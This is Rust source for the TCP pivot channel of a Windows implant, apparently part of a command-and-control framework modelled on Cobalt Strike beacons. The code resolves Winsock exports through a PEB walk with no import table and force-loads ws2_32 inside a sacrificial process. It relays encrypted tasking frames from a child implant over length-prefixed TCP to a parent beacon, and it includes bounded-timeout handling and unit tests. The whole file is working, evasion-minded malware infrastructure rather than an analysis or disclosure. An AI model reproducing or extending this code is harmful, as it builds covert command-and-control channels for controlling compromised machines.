//! TCP beacon channel — reverse_tcp P2P pivot.
//!
//! Cobalt Strike-style TCP Beacon: a child implant opens a TCP connection to a
//! parent beacon (reverse_tcp). Traffic flows child → TCP → parent → HTTPS →
//! server. This module implements the child (connecting) side only.
//!
//! ## Parent side
//! The team server hosts the parent listener (`crates/server/src/tcp_pivot.rs`,
//! `NYX_TCP_PIVOT_ADDR`); a parent implant's bind socket works too. The peer
//! is baked into the build config (`tcp_peer_host`/`tcp_peer_port`);
//! `SetChannel` rejects an unconfigured peer loudly and the dispatcher fails
//! fast with `ERR_CH_TCP_NOPEER` at transaction time.
//!
//! Framing: 4-byte little-endian length prefix followed by the frame body, in
//! both directions. This mirrors CS's `tcp_frame_header` malleable option with a
//! fixed u32 length prefix (simplified — no magic/nonce).
//!
//! All Winsock entry points are resolved via PEB walk (no IAT). `ws2_32.dll` is
//! NOT loaded by a fresh sacrificial process, so we force-load it via
//! `LoadLibraryA` (kernel32) before resolving exports — same pattern as
//! `transport::ensure_winhttp`.
//!
//! `#![no_std]` + PIC: buffers come from `nyx_implant_core::heap::Vec`, FFI types are
//! `unsafe extern "system" fn` (Windows x64 ABI). IP parsing is hand-rolled so we
//! don't need `inet_addr`/`inet_pton` (one fewer export to resolve + no legacy
//! deprecated-API surface).

#![cfg(target_os = "windows")]

use super::ChannelCtx;
use core::ffi::c_void;
use nyx_implant_core::heap::{vec, Vec};
use nyx_implant_core::resolve::export_addr;

// ══════════════════════════════════════════════════════════════════════════════
// Winsock constants
// ══════════════════════════════════════════════════════════════════════════════

/// AF_INET — IPv4 address family.
const AF_INET: i32 = 2;
/// SOCK_STREAM — reliable byte stream (TCP).
const SOCK_STREAM: i32 = 1;
/// IPPROTO_TCP.
const IPPROTO_TCP: i32 = 6;
/// Winsock version requested by WSAStartup: 2.2 (high byte = 2, low byte = 2).
const WSA_VERSION: u16 = 0x0202;
/// WSAStartup success code.
const WSA_SUCCESS: i32 = 0;

/// Maximum response body size we'll accept from the peer (16 MiB). Caps the OOM
/// surface: a malicious peer could otherwise claim an enormous length prefix and
/// exhaust the bump allocator. Matches `transport::MAX_RESPONSE_BYTES`.
const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;

/// FIONBIO — `ioctlsocket` command toggling non-blocking mode (`u_long` argp:
/// nonzero = non-blocking). Mirrors `pivot.rs`.
const FIONBIO: i32 = 0x8004_667Eu32 as i32;
/// SOL_SOCKET — socket-level option layer (`getsockopt`/`setsockopt`).
const SOL_SOCKET: i32 = 0xFFFF;
/// SO_ERROR — retrieve + clear the pending socket error (connect verdict).
const SO_ERROR: i32 = 0x1007;
/// SO_RCVTIMEO — receive timeout, DWORD milliseconds (Windows semantics).
const SO_RCVTIMEO: i32 = 0x1006;
/// SO_SNDTIMEO — send timeout, DWORD milliseconds (Windows semantics).
const SO_SNDTIMEO: i32 = 0x1005;
/// WSAEWOULDBLOCK — returned by `WSAGetLastError` when a non-blocking op
/// (here: `connect`) would block.
const WSAEWOULDBLOCK: i32 = 10035;
/// Connect deadline (ms). A blackholed / firewalled peer would otherwise hold
/// the single beacon thread through the kernel's full SYN-retry window
/// (implant-channels-3). 10s is generous for an internal P2P pivot.
const CONNECT_TIMEOUT_MS: u32 = 10_000;
/// Per-`send`/`recv` deadline (ms), applied via `SO_SNDTIMEO`/`SO_RCVTIMEO`.
/// On expiry Winsock returns `SOCKET_ERROR` with `WSAETIMEDOUT`, which
/// `send_all`/`recv_exact` already treat as failure → fail-fast.
const IO_TIMEOUT_MS: u32 = 10_000;

// ══════════════════════════════════════════════════════════════════════════════
// Winsock FFI types
// ══════════════════════════════════════════════════════════════════════════════

/// SOCKET handle. On Winsock it's a `UINT_PTR`, but we treat invalid as
/// `INVALID_SOCKET` (SOCKET_MAX). We use `usize` to stay ABI-correct on x64.
type Socket = usize;
/// Pointer-sized socket handle sentinel: (usize)-1 == INVALID_SOCKET.
const INVALID_SOCKET: Socket = usize::MAX;

/// `int (WSAAPI *LPFN_WSASTARTUP)(WORD, LPWSADATA)` → i32.
type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
/// `int (WSAAPI *LPFN_WSACLEANUP)(void)` → i32.
type FnWSACleanup = unsafe extern "system" fn() -> i32;
/// `SOCKET socket(int af, int type, int protocol)`.
type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> Socket;
/// `int connect(SOCKET s, const sockaddr *name, int namelen)`.
type FnConnect = unsafe extern "system" fn(Socket, *const SockaddrIn, i32) -> i32;
/// `int send(SOCKET s, const char *buf, int len, int flags)`.
type FnSend = unsafe extern "system" fn(Socket, *const u8, i32, i32) -> i32;
/// `int recv(SOCKET s, char *buf, int len, int flags)`.
type FnRecv = unsafe extern "system" fn(Socket, *mut u8, i32, i32) -> i32;
/// `int closesocket(SOCKET s)`.
type FnClosesocket = unsafe extern "system" fn(Socket) -> i32;
/// `int select(int nfds, fd_set*, fd_set*, fd_set*, const timeval*)`.
/// `nfds` is ignored on Windows; an fd_set is FD_SETSIZE (64) sockets.
type FnSelect =
    unsafe extern "system" fn(i32, *const FdSet, *const FdSet, *const FdSet, *const TimeVal) -> i32;
/// `int ioctlsocket(SOCKET s, long cmd, u_long *argp)`.
type FnIoctlsocket = unsafe extern "system" fn(Socket, i32, *mut u32) -> i32;
/// `int getsockopt(SOCKET, int level, int optname, char *optval, int *optlen)`.
type FnGetsockopt = unsafe extern "system" fn(Socket, i32, i32, *mut u8, *mut i32) -> i32;
/// `int setsockopt(SOCKET, int level, int optname, const char *optval, int optlen)`.
type FnSetsockopt = unsafe extern "system" fn(Socket, i32, i32, *const u8, i32) -> i32;
/// `int WSAGetLastError(void)`.
type FnWsaGetLastError = unsafe extern "system" fn() -> i32;

/// `fd_set` (winsock2.h, FD_SETSIZE = 64). `SOCKET` is `UINT_PTR` (= usize on
/// x64); only `fd_count` of the array entries are valid. Mirrors `pivot.rs`.
#[repr(C)]
#[derive(Clone, Copy)]
struct FdSet {
    fd_count: u32,
    fd_array: [usize; 64],
}

/// `struct timeval` as defined by winsock2.h — `LONG` fields, 32-bit even on
/// x64. Mirrors `pivot.rs`.
#[repr(C)]
#[derive(Clone, Copy)]
struct TimeVal {
    tv_sec: i32,
    tv_usec: i32,
}

/// Resolved Winsock function table (cached after first `ensure_ws2_32`).
struct WsaFns {
    wsa_startup: FnWSAStartup,
    wsa_cleanup: FnWSACleanup,
    socket: FnSocket,
    connect: FnConnect,
    send: FnSend,
    recv: FnRecv,
    closesocket: FnClosesocket,
    select: FnSelect,
    ioctlsocket: FnIoctlsocket,
    getsockopt: FnGetsockopt,
    setsockopt: FnSetsockopt,
    wsa_get_last_error: FnWsaGetLastError,
}

/// Winsock function table, stored as a raw pointer. 0 = uninitialized,
/// 1 = init failed, otherwise = pointer to a leaked `WsaFns`.
static WSA: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// sockaddr_in (16 bytes). sin_family is u16 on Windows (ADDRESS_FAMILY).
#[repr(C)]
struct SockaddrIn {
    sin_family: u16,
    sin_port: u16, // network byte order (big-endian)
    sin_addr: u32, // network byte order (big-endian)
    sin_zero: [u8; 8],
}

// ══════════════════════════════════════════════════════════════════════════════
// ws2_32 load + export resolution
// ══════════════════════════════════════════════════════════════════════════════

/// Force-load ws2_32.dll and resolve the Winsock function table once.
/// Idempotent: the `WSA` static makes repeat calls no-ops.
///
/// # Safety
/// Resolves OS function pointers via PEB walk + `LoadLibraryA` and installs
/// them into a process-lifetime static; transmutes assume the Win32 x64 ABI.
pub unsafe fn ensure_ws2_32() {
    use core::sync::atomic::Ordering;
    // Fast path: already attempted.
    let cur = WSA.load(Ordering::Acquire);
    if cur != 0 {
        return;
    }
    if !ensure_ws2_32_load_dll() {
        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        return;
    }
    match ensure_ws2_32_resolve() {
        Some(fns) => ensure_ws2_32_install(fns),
        None => {
            let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        }
    }
}

/// Force-load ws2_32.dll via kernel32 LoadLibraryA (PEB-walk resolution, no
/// IAT). Returns true when the module handle is non-null.
unsafe fn ensure_ws2_32_load_dll() -> bool {
    // Force-load ws2_32.dll via kernel32!LoadLibraryA.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let mut ws2_32_loaded = false;
    if let Some(addr) = export_addr(b"kernel32.dll", b"LoadLibraryA") {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"ws2_32.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            ws2_32_loaded = true;
        }
    }
    ws2_32_loaded
}

/// Resolve the 12 Winsock exports and build the function table.
/// Returns None when any export is missing.
unsafe fn ensure_ws2_32_resolve() -> Option<alloc::boxed::Box<WsaFns>> {
    // I/O timeouts (implant-channels-3): select/ioctlsocket/getsockopt for the
    // bounded non-blocking connect; setsockopt for SO_RCVTIMEO/SO_SNDTIMEO;
    // WSAGetLastError to distinguish WSAEWOULDBLOCK from a real connect error.
    if let (
        Some(wsa_startup),
        Some(wsa_cleanup),
        Some(socket),
        Some(connect),
        Some(send),
        Some(recv),
        Some(closesocket),
        Some(select),
        Some(ioctlsocket),
        Some(getsockopt),
        Some(setsockopt),
        Some(wsa_get_last_error),
    ) = (
        export_addr(b"ws2_32.dll", b"WSAStartup"),
        export_addr(b"ws2_32.dll", b"WSACleanup"),
        export_addr(b"ws2_32.dll", b"socket"),
        export_addr(b"ws2_32.dll", b"connect"),
        export_addr(b"ws2_32.dll", b"send"),
        export_addr(b"ws2_32.dll", b"recv"),
        export_addr(b"ws2_32.dll", b"closesocket"),
        export_addr(b"ws2_32.dll", b"select"),
        export_addr(b"ws2_32.dll", b"ioctlsocket"),
        export_addr(b"ws2_32.dll", b"getsockopt"),
        export_addr(b"ws2_32.dll", b"setsockopt"),
        export_addr(b"ws2_32.dll", b"WSAGetLastError"),
    ) {
        Some(ensure_ws2_32_build_table(
            wsa_startup,
            wsa_cleanup,
            socket,
            connect,
            send,
            recv,
            closesocket,
            select,
            ioctlsocket,
            getsockopt,
            setsockopt,
            wsa_get_last_error,
        ))
    } else {
        None
    }
}

/// Build the Winsock function table from the 12 resolved export addresses
/// (all non-null — the caller's `if let` already unwrapped them).
// One address parameter per Winsock export, in the same order as the resolve
// list above — packing them into a struct would only shuffle the arity.
#[allow(clippy::too_many_arguments)]
unsafe fn ensure_ws2_32_build_table(
    wsa_startup: usize,
    wsa_cleanup: usize,
    socket: usize,
    connect: usize,
    send: usize,
    recv: usize,
    closesocket: usize,
    select: usize,
    ioctlsocket: usize,
    getsockopt: usize,
    setsockopt: usize,
    wsa_get_last_error: usize,
) -> alloc::boxed::Box<WsaFns> {
    alloc::boxed::Box::new(WsaFns {
        wsa_startup: core::mem::transmute::<usize, FnWSAStartup>(wsa_startup),
        wsa_cleanup: core::mem::transmute::<usize, FnWSACleanup>(wsa_cleanup),
        socket: core::mem::transmute::<usize, FnSocket>(socket),
        connect: core::mem::transmute::<usize, FnConnect>(connect),
        send: core::mem::transmute::<usize, FnSend>(send),
        recv: core::mem::transmute::<usize, FnRecv>(recv),
        closesocket: core::mem::transmute::<usize, FnClosesocket>(closesocket),
        select: core::mem::transmute::<usize, FnSelect>(select),
        ioctlsocket: core::mem::transmute::<usize, FnIoctlsocket>(ioctlsocket),
        getsockopt: core::mem::transmute::<usize, FnGetsockopt>(getsockopt),
        setsockopt: core::mem::transmute::<usize, FnSetsockopt>(setsockopt),
        wsa_get_last_error: core::mem::transmute::<usize, FnWsaGetLastError>(wsa_get_last_error),
    })
}

/// One-time install of the resolved table into the static. If we lost the
/// race with a concurrent initializer, free our allocation.
unsafe fn ensure_ws2_32_install(fns: alloc::boxed::Box<WsaFns>) {
    use core::sync::atomic::Ordering;
    let ptr = alloc::boxed::Box::into_raw(fns) as usize;
    match WSA.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
        Ok(_) => {}
        Err(_) => {
            drop(alloc::boxed::Box::from_raw(ptr as *mut WsaFns));
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Helpers
// ══════════════════════════════════════════════════════════════════════════════

/// Parse a dotted-decimal IPv4 string (e.g. `"10.0.0.5"`) into a big-endian
/// `u32` in network byte order, suitable for `sockaddr_in.sin_addr`. Returns
/// `None` on malformed input. Hand-rolled so we don't need `inet_addr`/
/// `inet_pton` (one fewer export; `inet_addr` is also legacy-deprecated).
///
/// Accepts ASCII bytes (the host string is a `heap::String` of ASCII digits and
/// dots). Non-ASCII or stray characters → None.
fn parse_ipv4_be(s: &[u8]) -> Option<u32> {
    let mut octets: [u8; 4] = [0; 4];
    let mut idx = 0usize;
    let mut cur: u16 = 0;
    let mut have_digit = false;
    for &b in s {
        if b == b'.' {
            if !have_digit || idx >= 4 {
                return None;
            }
            if cur > 255 {
                return None;
            }
            octets[idx] = cur as u8;
            idx += 1;
            cur = 0;
            have_digit = false;
        } else if b.is_ascii_digit() {
            cur = cur.checked_mul(10)?.checked_add((b - b'0') as u16)?;
            have_digit = true;
        } else {
            return None;
        }
    }
    // Final octet (no trailing dot).
    if !have_digit || idx != 3 || cur > 255 {
        return None;
    }
    octets[3] = cur as u8;
    // Network byte order = big-endian: octet[0] is the most-significant byte.
    Some(u32::from_be_bytes(octets))
}

/// Send exactly `buf.len()` bytes on `s`, looping over partial `send` returns
/// (Winsock may return fewer bytes than requested). Returns true on full flush,
/// false on any error / peer close.
unsafe fn send_all(fns: &WsaFns, s: Socket, buf: &[u8]) -> bool {
    let mut sent = 0usize;
    while sent < buf.len() {
        let n = (fns.send)(
            s,
            buf.as_ptr().add(sent),
            (buf.len() - sent) as i32,
            0, // no flags
        );
        if n == 0 || n == -1 {
            return false;
        }
        sent += n as usize;
    }
    true
}

/// Receive exactly `n` bytes on `s`, looping over partial `recv` returns.
/// Returns `Some(Vec<u8>)` of length `n` on success, `None` on error / peer
/// close before `n` bytes. `n` must be > 0.
unsafe fn recv_exact(fns: &WsaFns, s: Socket, n: usize) -> Option<Vec<u8>> {
    let mut buf: Vec<u8> = vec![0u8; n];
    let mut got = 0usize;
    while got < n {
        let k = (fns.recv)(
            s,
            buf.as_mut_ptr().add(got),
            (n - got) as i32,
            0, // no flags
        );
        if k == 0 || k == -1 {
            return None;
        }
        got += k as usize;
    }
    Some(buf)
}

// ══════════════════════════════════════════════════════════════════════════════
// Public channel entry point
// ══════════════════════════════════════════════════════════════════════════════

/// Send an encrypted frame to the parent TCP beacon and return the parent's
/// response frame (or `None` on any failure).
///
/// Wire format (both directions): `[4-byte LE length][body bytes]`.
///
/// Steps:
/// 1. Validate `ctx.tcp_peer_host` / `ctx.tcp_peer_port` are configured.
/// 2. Ensure ws2_32 is loaded + exports resolved.
/// 3. `WSAStartup` (WSADATA on the stack, ~400 bytes).
/// 4. `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`.
/// 5. `connect` to the parsed IPv4 peer (reverse_tcp — outbound).
/// 6. Send `[len LE][frame]`.
/// 7. Recv `[len LE][response]`.
/// 8. `closesocket` + `WSACleanup` (always, even on error mid-stream).
///
/// Errors at any step → `None` (the beacon loop treats this as a channel failure
/// and will retry / fall back).
///
/// # Safety
/// Invokes Winsock function pointers resolved via PEB walk; `frame` must be a
/// valid buffer and `ctx.tcp_peer_host` a dotted-decimal IPv4 string.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // ---- Validate configuration ----
    // Empty host or zero port ⇒ channel not configured. Distinct diag mark so a
    // misconfigured beacon is diagnosable vs. a genuinely-unimplemented channel.
    if ctx.tcp_peer_host.is_empty() || ctx.tcp_peer_port == 0 {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_NOPEER");
        return None;
    }

    // ---- Parse peer IPv4 ----
    let sin_addr = match parse_ipv4_be(ctx.tcp_peer_host.as_bytes()) {
        Some(a) => a,
        None => {
            nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_BADIP");
            return None;
        }
    };
    // sin_port must be in network byte order (big-endian).
    let sin_port = ctx.tcp_peer_port.to_be();

    // ---- Resolve ws2_32 exports ----
    ensure_ws2_32();
    let ptr = WSA.load(core::sync::atomic::Ordering::Acquire);
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer stored by ensure_ws2_32 via Box::leak; process-lifetime.
    let fns = unsafe { &*(ptr as *const WsaFns) };

    // ---- WSAStartup ----
    // WSADATA is 400 bytes on Windows; 512 on the stack is a safe upper bound
    // and avoids any allocation before winsock is initialized.
    let mut wsadata: [u8; 512] = [0u8; 512];
    if (fns.wsa_startup)(WSA_VERSION, wsadata.as_mut_ptr()) != WSA_SUCCESS {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_WSASTARTUP");
        return None;
    }

    // Inner scope so `s` is bound and we can closesocket + WSACleanup in the
    // tail regardless of which step failed.
    let result = tcp_round(fns, sin_addr, sin_port, frame);

    // ---- Teardown (always, post-WSAStartup) ----
    (fns.wsa_cleanup)();
    result
}

/// One TCP round-trip: socket → connect → send frame → recv response. Owns the
/// socket lifecycle. Caller has already done WSAStartup and will do WSACleanup.
unsafe fn tcp_round(fns: &WsaFns, sin_addr: u32, sin_port: u16, frame: &[u8]) -> Option<Vec<u8>> {
    // ---- socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ----
    let s = (fns.socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if s == INVALID_SOCKET {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_SOCKET");
        return None;
    }

    // Guard: ensure we closesocket on every exit path after a valid socket.
    let outcome = tcp_exchange(fns, s, sin_addr, sin_port, frame);
    (fns.closesocket)(s);
    outcome
}

/// connect → send → recv over an already-created socket. Returns None (with a
/// diag mark) on any failure; the caller closes the socket.
///
/// ## Bounded I/O contract (implant-channels-3)
/// The beacon is single-threaded, so every step here carries a deadline:
/// - `connect` runs non-blocking (FIONBIO) and is resolved by `select` with a
///   [`CONNECT_TIMEOUT_MS`] deadline — a blackholed or firewalled peer can no
///   longer hold the beacon thread through the kernel's full SYN-retry window.
/// - `send`/`recv` are bounded by [`SO_SNDTIMEO`]/[`SO_RCVTIMEO`] ([`IO_TIMEOUT_MS`]
///   each); on expiry Winsock returns `SOCKET_ERROR` with `WSAETIMEDOUT`, which
///   `send_all`/`recv_exact` already treat as failure → fail-fast.
unsafe fn tcp_exchange(
    fns: &WsaFns,
    s: Socket,
    sin_addr: u32,
    sin_port: u16,
    frame: &[u8],
) -> Option<Vec<u8>> {
    // ---- connect with deadline ----
    let addr = SockaddrIn {
        sin_family: AF_INET as u16,
        sin_port,
        sin_addr,
        sin_zero: [0u8; 8],
    };
    if !tcp_exchange_connect(fns, s, &addr) {
        return None;
    }
    tcp_exchange_io_timeouts(fns, s);
    if !tcp_exchange_send(fns, s, frame) {
        return None;
    }
    tcp_exchange_recv(fns, s)
}

/// Bounded non-blocking connect: FIONBIO + select-for-writability with a
/// CONNECT_TIMEOUT_MS deadline, SO_ERROR verdict, then restore blocking mode.
/// Returns false (with ERR_CH_TCP_CONNECT) when the connect failed.
unsafe fn tcp_exchange_connect(fns: &WsaFns, s: Socket, addr: &SockaddrIn) -> bool {
    // Non-blocking connect + select-for-writability, then restore blocking
    // mode for the (timeout-bounded) send/recv phase. Same shape as
    // `pivot.rs`'s connect; the only difference is we always restore blocking
    // mode because this socket is used synchronously below.
    let mut nonblock: u32 = 1;
    let _ = (fns.ioctlsocket)(s, FIONBIO, &mut nonblock);
    let rc = (fns.connect)(s, addr, core::mem::size_of::<SockaddrIn>() as i32);
    let mut connected = rc == 0;
    if !connected && (fns.wsa_get_last_error)() == WSAEWOULDBLOCK {
        let mut wfds = FdSet {
            fd_count: 1,
            fd_array: [0usize; 64],
        };
        wfds.fd_array[0] = s;
        let tv = TimeVal {
            tv_sec: (CONNECT_TIMEOUT_MS / 1000) as i32,
            tv_usec: ((CONNECT_TIMEOUT_MS % 1000) * 1000) as i32,
        };
        let n = (fns.select)(0, core::ptr::null(), &wfds, core::ptr::null(), &tv);
        if n > 0 {
            // select said writable — confirm the connect actually succeeded
            // (the pending error, if any, lands in SO_ERROR).
            let mut err: i32 = 0;
            let mut errlen: i32 = core::mem::size_of::<i32>() as i32;
            if (fns.getsockopt)(
                s,
                SOL_SOCKET,
                SO_ERROR,
                &mut err as *mut i32 as *mut u8,
                &mut errlen,
            ) == 0
                && err == 0
            {
                connected = true;
            }
        }
    }
    // Back to blocking mode; SO_*TIMEO bounds the blocking ops below.
    let mut blocking: u32 = 0;
    let _ = (fns.ioctlsocket)(s, FIONBIO, &mut blocking);
    if !connected {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_CONNECT");
        return false;
    }
    true
}

/// Bound the send/recv phases with SO_SNDTIMEO / SO_RCVTIMEO (IO_TIMEOUT_MS).
unsafe fn tcp_exchange_io_timeouts(fns: &WsaFns, s: Socket) {
    // ---- Bound send/recv with SO_SNDTIMEO / SO_RCVTIMEO ----
    // Winsock takes the DWORD millisecond value; on the LE x64 target copying
    // the u32 (via its bytes) is correct.
    let sndto: u32 = IO_TIMEOUT_MS;
    let _ = (fns.setsockopt)(
        s,
        SOL_SOCKET,
        SO_SNDTIMEO,
        &sndto as *const u32 as *const u8,
        core::mem::size_of::<u32>() as i32,
    );
    let rcvto: u32 = IO_TIMEOUT_MS;
    let _ = (fns.setsockopt)(
        s,
        SOL_SOCKET,
        SO_RCVTIMEO,
        &rcvto as *const u32 as *const u8,
        core::mem::size_of::<u32>() as i32,
    );
}

/// Send length prefix (LE) + frame body. Returns false (with ERR_CH_TCP_SEND)
/// on a send failure.
unsafe fn tcp_exchange_send(fns: &WsaFns, s: Socket, frame: &[u8]) -> bool {
    // ---- Send length prefix (LE) + frame body ----
    let len_be: [u8; 4] = (frame.len() as u32).to_le_bytes();
    let mut wire: Vec<u8> = Vec::with_capacity(4 + frame.len());
    wire.extend_from_slice(&len_be);
    wire.extend_from_slice(frame);
    if !send_all(fns, s, &wire) {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_SEND");
        return false;
    }
    true
}

/// Recv length prefix (LE) + response body. Rejects a huge length prefix
/// (MAX_RESPONSE_BYTES cap) and maps a zero-length reply to Some(empty).
unsafe fn tcp_exchange_recv(fns: &WsaFns, s: Socket) -> Option<Vec<u8>> {
    // ---- Recv length prefix (LE) ----
    let len_buf = recv_exact(fns, s, 4)?;
    let resp_len = u32::from_le_bytes([len_buf[0], len_buf[1], len_buf[2], len_buf[3]]) as usize;

    // Guard: a malicious/buggy peer could claim a huge length to exhaust the
    // bump allocator. Cap at MAX_RESPONSE_BYTES (16 MiB) and reject otherwise.
    if resp_len == 0 {
        // Legitimate empty response — no body to read. "No tasking" sentinel:
        // return Some(empty) so the beacon treats the round-trip as SUCCESS
        // (counter advances, pending batch clears) rather than None, which
        // reads as a channel failure and triggers a fallback switch + batch
        // retry. An empty body parses as "no tasks" in beacon_dispatch_tasks.
        return Some(Vec::new());
    }
    if resp_len > MAX_RESPONSE_BYTES {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_HUGERESP");
        return None;
    }

    // ---- Recv response body ----
    let body = recv_exact(fns, s, resp_len);
    if body.is_none() {
        nyx_implant_core::diag::diag_mark(b"ERR_CH_TCP_RECV");
        return None;
    }
    body
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil;
    use nyx_implant_core::heap::String;
    use std::time::Duration;

    #[test]
    fn parse_ipv4_be_accepts_dotted_decimal() {
        assert_eq!(parse_ipv4_be(b"127.0.0.1"), Some(0x7F00_0001));
        assert_eq!(parse_ipv4_be(b"0.0.0.0"), Some(0));
        assert_eq!(parse_ipv4_be(b"255.255.255.255"), Some(0xFFFF_FFFF));
        assert_eq!(parse_ipv4_be(b"10.20.30.40"), Some(0x0A14_1E28));
        // Network byte order: octet 0 lands in the most-significant byte.
        assert_eq!(parse_ipv4_be(b"1.2.3.4"), Some(0x0102_0304));
    }

    #[test]
    fn parse_ipv4_be_rejects_malformed() {
        let bad: &[&[u8]] = &[
            b"",
            b"1.2.3",
            b"1.2.3.4.5",
            b"256.1.1.1",
            b"1.2.3.999",
            b"1.2.3.",
            b".1.2.3",
            b"1..2.3",
            b"a.b.c.d",
            b"1.2.3.4x",
            b"1.2.3.4 ",
            // Octet accumulator overflows u16 before the >255 check.
            b"65536.0.0.1",
        ];
        for s in bad {
            assert_eq!(parse_ipv4_be(s), None, "must reject {:?}", s);
        }
    }

    #[test]
    fn send_recv_rejects_unconfigured_or_bad_peer() {
        // Empty peer host → unconfigured.
        let mut c = testutil::ctx("127.0.0.1", 9);
        assert!(unsafe { send_recv(&c, b"x") }.is_none());
        // Malformed IPv4 → rejected before any syscall.
        c.tcp_peer_host = String::from("999.1.1.1");
        c.tcp_peer_port = 4444;
        assert!(unsafe { send_recv(&c, b"x") }.is_none());
        // Port 0 → unconfigured.
        c.tcp_peer_host = String::from("127.0.0.1");
        c.tcp_peer_port = 0;
        assert!(unsafe { send_recv(&c, b"x") }.is_none());
    }

    /// Bounded-I/O contract (implant-channels-3): a peer that accepts the TCP
    /// connection but never sends a response must NOT hold the beacon thread
    /// forever — SO_RCVTIMEO (IO_TIMEOUT_MS = 10 s) bounds the recv and the
    /// channel reports failure. Deterministic on every stack: a silent peer
    /// can never produce `Some`.
    #[test]
    fn send_recv_silent_peer_fails_within_io_timeout() {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            // Accept and hold the connection open in silence (wedged parent
            // beacon). The socket dies with the test process.
            let _conn = listener.accept();
            std::thread::sleep(std::time::Duration::from_secs(30));
        });
        let mut c = testutil::ctx("127.0.0.1", 9);
        c.tcp_peer_host = String::from("127.0.0.1");
        c.tcp_peer_port = port;
        let t0 = std::time::Instant::now();
        let out = unsafe { send_recv(&c, b"PING") };
        let elapsed = t0.elapsed();
        assert!(out.is_none(), "a silent peer can never yield a frame");
        assert!(
            elapsed < std::time::Duration::from_secs(25),
            "silent peer held the channel for {elapsed:?} — SO_RCVTIMEO is not bounding the recv"
        );
    }

    /// Full Winsock round trip: PEB-walk resolution of ws2_32, WSAStartup,
    /// bounded non-blocking connect, LE-length-prefixed framing in both
    /// directions, clean teardown.
    ///
    /// IGNORED by default: the dev-host emulator (wine 7.7, Game Porting
    /// Toolkit) accepts the connection and reports successful connect/send via
    /// ws2_32, but its loopback data plane never delivers bytes to a raw
    /// ws2_32 socket (verified with standalone probes: server receives
    /// nothing, client recv sees EOF/timeout — WinHTTP loopback in the same
    /// process works, so this is a wine ws2_32 fidelity gap, not an implant
    /// logic bug). Run on real Windows with `-- --ignored`.
    #[test]
    #[ignore = "wine 7.7 GPTK ws2_32 loopback data plane drops traffic; run on real Windows"]
    fn send_recv_loopback_frame_roundtrip() {
        let (port, rx) = testutil::one_shot_tcp_frame_server(b"PONG".to_vec());
        let mut c = testutil::ctx("127.0.0.1", 9);
        c.tcp_peer_host = String::from("127.0.0.1");
        c.tcp_peer_port = port;
        let out = unsafe { send_recv(&c, b"PING") };
        assert_eq!(out.as_deref(), Some(b"PONG".as_slice()));
        let got = rx
            .recv_timeout(Duration::from_secs(15))
            .expect("pivot server received frame");
        assert_eq!(got, b"PING");
    }

    #[test]
    fn send_recv_closed_port_fails_fast() {
        // Nothing listening → bounded connect fails, mapped to None.
        let port = {
            let l = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
            l.local_addr().unwrap().port()
        };
        let mut c = testutil::ctx("127.0.0.1", 9);
        c.tcp_peer_host = String::from("127.0.0.1");
        c.tcp_peer_port = port;
        assert!(unsafe { send_recv(&c, b"x") }.is_none());
    }
}



